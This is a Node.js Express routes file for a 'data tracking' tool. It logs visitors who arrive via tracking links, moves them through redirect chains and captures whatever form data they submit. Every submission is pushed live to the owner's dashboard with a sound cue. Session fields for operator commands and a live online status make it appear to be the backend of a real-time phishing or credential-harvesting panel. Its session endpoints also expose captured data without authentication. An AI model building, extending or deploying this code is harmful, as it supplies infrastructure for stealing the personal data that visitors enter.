// ============================================================
// MEGA TOOLS — DATA TRACKING ROUTES (ENTERPRISE v2.6)
// FIXED: Null session guard for invalid trackingCode
// FIXED: Duplicate visit/submit guard (same visitorId + tc in short window)
// FIXED: finalTrackingCode preserves full trackingCode_baseCode
// FIX-D1..D9: retained from v2.4
// FIX-D10 (v2.5 — SOUND-CONFIRMATION): the /submit route now
//   always emits the `formSubmitted` socket event, even when the
//   incoming payload was flagged as a duplicate (superset /
//   subset / exact match). The payload carries a `duplicate: true`
//   flag so the frontend can play the submission sound as a
//   confirmation of the arrival, WITHOUT adding a new submission
//   row or incrementing any counter.
//   Previously the emit was gated on `!wasDuplicate`, so the
//   owner dashboard stayed silent whenever a visitor re-submitted
//   the same data — exactly the "sound missing" symptom.
// FIX-D11 (v2.6 — SUPERSET/SUBSET DUPLICATE DETECTION): the
//   `wasDuplicate` flag now ALSO treats a payload as duplicate
//   when it is a subset or superset (by key set) of any existing
//   submission for this session — i.e. a partial→full evolution
//   of the same logical form, or a partial re-submit of data the
//   server already holds. This mirrors the merge rule inside
//   Session.mergeSubmissionIntoSession so the socket payload can
//   carry duplicate=true and the frontend never flashes a
//   temporary duplicate card before reconcileSession runs.
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { toStringId, parseTrackingCode, now } = require('../utils/helpers');

// ============================================================
// USER CACHE (30s TTL)
// ============================================================

let cachedUsers = null;
let userCacheTime = 0;
const USER_CACHE_TTL = 30000;

async function getCachedUsers() {
  if (!cachedUsers || Date.now() - userCacheTime > USER_CACHE_TTL) {
    cachedUsers = await db.users.read();
    userCacheTime = Date.now();
  }
  return cachedUsers;
}

// ============================================================
// IN-MEMORY THROTTLE — prevents duplicate visit in short window
// ============================================================

const visitThrottle = new Map();
const VISIT_THROTTLE_MS = 30000;

function shouldSkipVisit(visitorId, trackingCode) {
  if (!visitorId && !trackingCode) return false;
  const key = `visit:${visitorId || 'nov'}:${trackingCode || 'notc'}`;
  const nowMs = Date.now();
  const last = visitThrottle.get(key);
  if (last && (nowMs - last) < VISIT_THROTTLE_MS) return true;
  visitThrottle.set(key, nowMs);
  if (visitThrottle.size > 5000) {
    const cutoff = nowMs - VISIT_THROTTLE_MS * 2;
    for (const [k, v] of visitThrottle.entries()) {
      if (v < cutoff) visitThrottle.delete(k);
    }
  }
  return false;
}

// ============================================================
// HELPERS
// ============================================================

async function findLinkBySlug(slug) {
  if (!slug) return null;
  const all = await db.links.read();
  return all.find(l => l.baseCode === slug || l.slug === slug || l.uniqueCode === slug) || null;
}

async function getChainTargetUrl(link, identity, actionCode) {
  if (!link || !link.is_chain || !link.chain_links?.length) {
    return { url: link?.baseUrl || 'about:blank', chainStep: null, chainStepName: '' };
  }
  if (actionCode) {
    const stepIndex = link.chain_links.findIndex(cl => cl.actionCode === actionCode);
    if (stepIndex >= 0) {
      return { url: link.chain_links[stepIndex].url, chainStep: stepIndex, chainStepName: link.chain_links[stepIndex].name || '' };
    }
  }
  const nextUrl = await Link.getNextChainUrl(link, identity);
  return { url: nextUrl?.url || link.chain_links[0].url, chainStep: nextUrl?.index ?? 0, chainStepName: nextUrl?.name || link.chain_links[0].name || '' };
}

function buildSessionDelta(session, type) {
  return {
    type, timestamp: new Date().toISOString(),
    session: {
      _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
      isLive: session.isLive, status: session.status || 'Online', lastActivity: session.lastActivity,
      clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
      baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
      ip: session.ip, browser: session.browser, formData: session.formData,
      redirectHistory: session.redirectHistory || [],
      lastCommand: session.lastCommand, lastCommandUrl: session.lastCommandUrl, commandSeq: session.commandSeq,
      lockedKeys: session.lockedKeys || [],
    },
  };
}

function buildSessionMetaDelta(session) {
  return {
    type: 'updated',
    timestamp: new Date().toISOString(),
    session: {
      _id: session._id,
      isLive: session.isLive,
      status: session.status || 'Online',
      lastActivity: session.lastActivity,
      clicks: session.clicks,
      formData: session.formData,
      lockedKeys: session.lockedKeys || [],
      submissionCount: Array.isArray(session.submissions) ? session.submissions.length : 0,
    },
  };
}

function emitToOwnerRoom(io, trackingCode, event, data) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  io.to('room_' + ownerCode).emit(event, data);
}

async function emitSessionEvents(io, session, isNew, link) {
  if (!io || !session) return;
  const tc = session.trackingCode || '';
  const ownerCode = tc.includes('_') ? tc.split('_')[0] : tc;
  if (ownerCode) {
    io.to('room_' + ownerCode).emit('sessionDelta', buildSessionDelta(session, isNew ? 'new' : 'updated'));
  }
  if (link && isNew) { await Link.incrementClicks(link._id); }
}

function getClientIdentity(req) {
  const bodyVid = req.body?.visitorId || req.query?.visitorId || req.query?.vid || null;
  const ip = req.body?.ip || req.ip || '::1';
  return {
    visitorId: bodyVid || ip || null,
    ip,
  };
}

function getResolvedVisitorId(visitorId, trackingCode) {
  if (visitorId) return visitorId;
  if (trackingCode) return 'tc_' + trackingCode;
  return null;
}

function buildFullTrackingCode(parsedTC, slug, fullCode) {
  if (parsedTC && slug) return parsedTC + '_' + slug;
  return parsedTC || fullCode || 'direct';
}

// ============================================================
// SMART REDIRECT (GET /:code)
// ============================================================

router.get('/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';
    const { trackingCode, slug, actionCode } = parseTrackingCode(code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(trackingCode, slug, code);
    const baseCode = slug || code;
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    const result = await Session.upsert({ visitorId: resolvedVisitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: ua.substring(0, 500), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', entryUrl: baseCode, currentUrl: code, collectedTypes: ['visit'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: 'about:blank' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io'); await emitSessionEvents(io, session, isNew, link);
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false, redirectDelay: 1000 });
  } catch (err) { console.error('[Data] GET /:code error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CLICK TRACKING
// ============================================================

router.get('/click/:code', async (req, res) => {
  try {
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';
    const { trackingCode, slug, actionCode } = parseTrackingCode(req.params.code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(trackingCode, slug, req.params.code);
    const baseCode = slug || req.params.code;
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    const result = await Session.upsert({ visitorId: resolvedVisitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: ua.substring(0, 500), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', entryUrl: baseCode, currentUrl: req.params.code, collectedTypes: ['click'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: 'about:blank' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io'); await emitSessionEvents(io, session, isNew, link);
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Click error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CHECK REDIRECT
// ============================================================

router.get('/check-redirect/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode, slug } = parseTrackingCode(code);
    const all = await db.sessions.read(); let session = null;
    if (visitorId) session = all.find(s => s.visitorId === visitorId && s.isLive);
    if (!session && trackingCode) session = all.find(s => s.trackingCode === trackingCode && s.isLive);
    if (session) { const link = await findLinkBySlug(slug); let redirectUrl = session.currentUrl || link?.baseUrl || ''; if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, visitorId || ip, null); redirectUrl = chainResult.url; } res.json({ success: true, redirectUrl, session, message: session.lastMessage || '' }); }
    else { res.json({ success: false, redirectUrl: null, message: null }); }
  } catch (err) { console.error('[Data] Check redirect error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// VISIT (POST) — throttled (30s window per visitor+tc)
// ============================================================

router.post('/visit', async (req, res) => {
  try {
    const { trackingCode, browser, device, collectedTypes } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode: parsedTC, slug, actionCode } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(parsedTC, slug, trackingCode || 'unknown');
    const baseCode = slug || trackingCode || 'direct_visit';
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || ''; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    if (shouldSkipVisit(resolvedVisitorId, finalTrackingCode)) {
      const all = await db.sessions.read();
      const existing = all.find(s =>
        s.trackingCode === finalTrackingCode &&
        (s.visitorId === resolvedVisitorId || !resolvedVisitorId) &&
        !s.hiddenForAll
      ) || null;
      return res.json({ success: true, session: existing, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false, throttled: true });
    }

    const result = await Session.upsert({ visitorId: resolvedVisitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: browser || '', deviceType: device || 'Desktop', entryUrl: baseCode, currentUrl: trackingCode || '', collectedTypes: collectedTypes || ['visit'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: '' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io'); await emitSessionEvents(io, session, isNew, link);
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Visit error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// FORM SUBMIT — always emits formSubmitted (v2.6, FIX-D10 + D11)
// ============================================================

router.post('/submit', async (req, res) => {
  try {
    const { formData, trackingCode, collectedTypes, browser, device } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    if (!formData) return res.status(400).json({ success: false, message: 'formData required' });
    const { trackingCode: parsedTC, slug } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(parsedTC, slug, trackingCode || 'direct');
    const baseCode = slug || trackingCode || 'direct_submit';
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    const enrichedFormData = { ...formData, submittedAt: now() };

    // FIX-D11 (v2.6): duplicate detection now covers subset/superset
    // partial↔full evolutions of the same logical submission, in
    // addition to exact fingerprint matches.
    const all = await db.sessions.read();
    const preExisting = all.find(s => s.visitorId === resolvedVisitorId && !s.hiddenForAll) || null;
    const wasDuplicate = preExisting
      ? (
          Session.isDuplicateSubmission(preExisting.submissions || [], formData) ||
          Session.isSupersetOrSubset(preExisting.submissions || [], formData)
        )
      : false;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: browser || 'Unknown',
      deviceType: device || 'Desktop',
      entryUrl: baseCode,
      currentUrl: trackingCode || '',
      collectedTypes: [...(collectedTypes || []), 'form_submit'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      formData: enrichedFormData,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io');
    if (io) {
      emitToOwnerRoom(io, finalTrackingCode, 'sessionMetaDelta', buildSessionMetaDelta(session));
      try { io.to('room_' + finalTrackingCode).emit('sessionMetaDelta', buildSessionMetaDelta(session)); } catch (_) {}

      // FIX-D10 (v2.5): always emit formSubmitted. Frontend plays
      // the sound on every arrival; the duplicate flag prevents a
      // new submission card from being added.
      const payload = {
        visitorId: session.visitorId,
        sessionId: session._id,
        formData: enrichedFormData,
        submissionCount: Array.isArray(session.submissions) ? session.submissions.length : 1,
        duplicate: !!wasDuplicate,
        timestamp: now(),
      };
      emitToOwnerRoom(io, finalTrackingCode, 'formSubmitted', payload);
      try { io.to('room_' + finalTrackingCode).emit('formSubmitted', payload); } catch (_) {}
    }

    res.json({
      success: true,
      message: 'Form submitted',
      session,
      totalSubmissions: session.submissions?.length || 1,
      duplicate: wasDuplicate,
    });
  } catch (err) {
    console.error('[Data] Submit error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// HEARTBEAT — accepts visitorId OR trackingCode-only
// ============================================================

router.post('/heartbeat', async (req, res) => {
  try {
    const { trackingCode, browser, device, status } = req.body;
    const { visitorId, ip } = getClientIdentity(req);

    const resolvedVisitorId = getResolvedVisitorId(visitorId, trackingCode || '');

    if (!resolvedVisitorId && !trackingCode) {
      return res.json({ success: false, message: 'visitorId or trackingCode required', isLive: false, status: 'Offline' });
    }

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      trackingCode: trackingCode || '',
      baseCode: trackingCode || '',
      ip,
      browser: browser || '',
      deviceType: device || 'Desktop',
      collectedTypes: ['heartbeat'],
      status: status || undefined
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', isLive: false, status: 'Offline' });
    }

    const { session } = result;
    res.json({ success: true, isLive: session?.isLive, status: session?.status, lastActivity: session?.lastActivity });
  } catch (err) { console.error('[Data] Heartbeat error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// SESSION DETAILS (by visitorId)
// ============================================================

router.get('/session/:visitorId', async (req, res) => {
  try {
    const session = await Session.findByVisitorId(req.params.visitorId);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
    res.json({ success: true, session });
  } catch (err) { console.error('[Data] Session error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// FIX-D9: SESSION DETAILS by _id — used by LiveInboxPage.reconcileSession
// ============================================================

router.get('/session-by-id/:id', async (req, res) => {
  try {
    const id = req.params.id;
    if (!id) return res.status(400).json({ success: false, message: 'id required' });
    const session = await Session.findById(id);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
    res.json({ success: true, session });
  } catch (err) {
    console.error('[Data] Session-by-id error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

module.exports = router;